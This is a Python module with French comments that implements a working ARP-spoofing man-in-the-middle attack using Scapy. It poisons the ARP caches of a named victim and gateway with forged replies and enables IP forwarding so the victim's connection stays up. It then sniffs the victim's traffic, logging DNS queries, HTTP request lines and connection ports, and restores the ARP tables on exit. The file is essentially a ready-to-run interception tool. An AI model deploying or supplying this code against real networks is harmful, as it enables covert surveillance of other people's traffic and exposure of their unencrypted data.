#!/usr/bin/env python3
"""
Module MITM — ARP Spoofing avec Scapy.
Active le forwarding IP pour ne pas couper la connexion de la victime.
"""

import time
import threading
from scapy.all import (
    ARP, Ether, sendp, srp, sniff,
    IP, TCP, UDP, DNS, Raw,
    get_if_hwaddr, conf
)


def get_mac(ip: str, interface: str) -> str:
    """Résout l'adresse MAC d'une IP via ARP."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=interface, verbose=False
    )
    if ans:
        return ans[0][1].hwsrc
    raise ValueError(f"Impossible de résoudre MAC pour {ip}")


class MITMAttack:
    def __init__(self, victim_ip, gateway_ip, interface, stop_event, report_fn):
        self.victim_ip   = victim_ip
        self.gateway_ip  = gateway_ip
        self.iface       = interface
        self.stop        = stop_event
        self.report      = report_fn
        self.pkt_count   = 0
        self.victim_mac  = None
        self.gw_mac      = None
        self.my_mac      = get_if_hwaddr(interface)

    def enable_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print("[+] IP Forwarding activé")
        except Exception as e:
            print(f"[!] Impossible d'activer le forwarding: {e}")

    def disable_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except Exception:
            pass

    def restore_arp(self):
        """Restaure les vraies tables ARP (important en fin d'attaque)."""
        print("[*] Restauration des tables ARP...")
        for _ in range(5):
            sendp(
                Ether(dst=self.victim_mac) /
                ARP(op=2, pdst=self.victim_ip, hwdst=self.victim_mac,
                    psrc=self.gateway_ip, hwsrc=self.gw_mac),
                iface=self.iface, verbose=False
            )
            sendp(
                Ether(dst=self.gw_mac) /
                ARP(op=2, pdst=self.gateway_ip, hwdst=self.gw_mac,
                    psrc=self.victim_ip, hwsrc=self.victim_mac),
                iface=self.iface, verbose=False
            )
            time.sleep(0.2)
        print("[+] Tables ARP restaurées")

    def poison(self):
        """Envoie des faux ARP Reply en boucle."""
        pkt_to_victim = (
            Ether(dst=self.victim_mac) /
            ARP(op=2, pdst=self.victim_ip, hwdst=self.victim_mac,
                psrc=self.gateway_ip, hwsrc=self.my_mac)
        )
        pkt_to_gw = (
            Ether(dst=self.gw_mac) /
            ARP(op=2, pdst=self.gateway_ip, hwdst=self.gw_mac,
                psrc=self.victim_ip, hwsrc=self.my_mac)
        )
        while not self.stop.is_set():
            sendp(pkt_to_victim, iface=self.iface, verbose=False)
            sendp(pkt_to_gw,     iface=self.iface, verbose=False)
            self.report({
                "type":                "mitm_status",
                "active":              True,
                "arp_poisoned":        True,
                "packets_intercepted": self.pkt_count,
                "victim_ip":           self.victim_ip,
                "gateway_ip":          self.gateway_ip,
            })
            time.sleep(1.5)

    def analyze_packet(self, pkt):
        """Filtre les paquets entre victime et passerelle."""
        if IP not in pkt:
            return
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst

        # Ne capturer que le trafic de/vers la victime
        if src_ip != self.victim_ip and dst_ip != self.victim_ip:
            return

        self.pkt_count += 1

        # Déduction du protocole et infos
        proto = "IP"
        info  = ""
        size  = len(pkt)

        if DNS in pkt:
            proto = "DNS"
            try:
                info = f"Query: {pkt[DNS].qd.qname.decode()}"
            except Exception:
                info = "DNS Query"
        elif TCP in pkt:
            dport = pkt[TCP].dport
            sport = pkt[TCP].sport
            if dport == 80 or sport == 80:
                proto = "HTTP"
                if Raw in pkt:
                    raw = pkt[Raw].load.decode(errors='ignore')
                    if raw.startswith(('GET', 'POST', 'HTTP')):
                        info = raw.split('\r\n')[0][:60]
                    else:
                        info = f":{sport} → :{dport}"
                else:
                    info = f":{sport} → :{dport}"
            elif dport == 443 or sport == 443:
                proto = "HTTPS"
                info  = f"TLS :{sport} → :{dport}"
            else:
                proto = "TCP"
                info  = f":{sport} → :{dport}"
        elif UDP in pkt:
            proto = "UDP"
            info  = f":{pkt[UDP].sport} → :{pkt[UDP].dport}"

        self.report({
            "type":     "mitm_packet",
            "src":      src_ip,
            "dst":      dst_ip,
            "protocol": proto,
            "info":     info,
            "size":     size,
        })

    def run(self):
        print(f"[*] Résolution MAC de la victime  ({self.victim_ip})…")
        try:
            self.victim_mac = get_mac(self.victim_ip, self.iface)
            print(f"[+] Victime MAC: {self.victim_mac}")
        except ValueError as e:
            print(f"[!] {e}")
            self.report({"type": "mitm_status", "active": False, "arp_poisoned": False,
                         "packets_intercepted": 0, "victim_ip": self.victim_ip,
                         "gateway_ip": self.gateway_ip, "error": str(e)})
            return

        print(f"[*] Résolution MAC de la passerelle ({self.gateway_ip})…")
        try:
            self.gw_mac = get_mac(self.gateway_ip, self.iface)
            print(f"[+] Passerelle MAC: {self.gw_mac}")
        except ValueError as e:
            print(f"[!] {e}")
            return

        self.enable_forwarding()

        # Thread d'empoisonnement ARP
        poison_thread = threading.Thread(target=self.poison, daemon=True)
        poison_thread.start()

        # Sniffing du trafic (filtre BPF pour la victime)
        print(f"[*] Sniffing du trafic de/vers {self.victim_ip}…")
        sniff(
            iface=self.iface,
            filter=f"host {self.victim_ip}",
            prn=self.analyze_packet,
            stop_filter=lambda p: self.stop.is_set(),
            store=False,
        )

        # Nettoyage
        self.stop.set()
        self.restore_arp()
        self.disable_forwarding()
        self.report({
            "type":                "mitm_status",
            "active":              False,
            "arp_poisoned":        False,
            "packets_intercepted": self.pkt_count,
            "victim_ip":           self.victim_ip,
            "gateway_ip":          self.gateway_ip,
        })
        